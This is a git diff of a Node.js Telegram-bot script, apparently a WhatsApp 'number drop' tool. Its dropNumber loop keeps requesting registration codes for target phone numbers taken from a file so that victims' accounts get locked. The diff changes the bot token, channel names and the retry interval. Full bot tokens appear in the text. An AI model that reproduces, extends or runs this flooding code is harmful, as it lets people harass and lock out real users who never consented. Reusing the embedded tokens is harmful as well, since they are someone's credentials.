@@ -12,10 +12,10 @@ const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysocket
 const numbers = JSON.parse(fs.readFileSync('number.json'));
 
 // Replace with your bot token from BotFather
-const botToken = '6917948647:AAGnoATrfnt3h1C8uqvmmG_JEH99OC8dm4Q';
+const botToken = '7255542532:AAGm0m8VjeC-9dKiHg7iOV_qrsri_Ha0SbA';
 // Replace with your channel usernames or IDs
-const channelId1 = '@TeAm_Ali_1';
-const channelId2 = '@TeAm_Ali_1';
+const channelId1 = '@PakCyberXpert';
+const channelId2 = '@PakCyberXpert';
 
 const start = async () => {
   const { state, saveCreds } = await useMultiFileAuthState('.mm');
@@ -27,29 +27,30 @@ const start = async () => {
 
   console.clear();
 
-  const dropNumber = async (context) => {
+const dropNumber = async (context) => {
     const { phoneNumber, ddi, number } = context;
     while (true) {
-      try {
-        const res = await spam.requestRegistrationCode({
-          phoneNumber: '+' + phoneNumber,
-          phoneNumberCountryCode: ddi,
-          phoneNumberNationalNumber: number,
-          phoneNumberMobileCountryCode: 666,
-        });
-        const b = res.reason === 'temporarily_unavailable';
-        if (b) {
-          console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
-          setTimeout(async () => {
-            dropNumber(context);
-          }, res.retry_after * 3600 * 1000);
-          return;
+        try {
+            const res = await spam.requestRegistrationCode({
+                phoneNumber: '+' + phoneNumber,
+                phoneNumberCountryCode: ddi,
+                phoneNumberNationalNumber: number,
+                phoneNumberMobileCountryCode: 666,
+            });
+            const b = res.reason === 'temporarily_unavailable';
+            if (b) {
+                console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
+                setTimeout(async () => {
+                    await dropNumber(context);
+                }, 24 * 3600 * 1000);  // 24 hours in milliseconds
+                return;
+            }
+        } catch (error) {
+            console.log(error);
         }
-      } catch (error) {
-        console.log(error);
-      }
     }
-  };
+};
+
 
   const bot = new TelegramBot(botToken, { polling: true });
 
@@ -60,8 +61,8 @@ const start = async () => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'Button 1', url: 'https://t.me/TeAm_Ali_1' },
-            { text: 'Button 2', url: 'https://t.me/ZararJazz45' }
+            { text: 'Button 1', url: 'https://t.me/PakCyberXpert' },
+            { text: 'Button 2', url: 'https://t.me/PakCyberXpert' }
           ],
           [
             { text: 'Check Join', callback_data: 'check_join' }
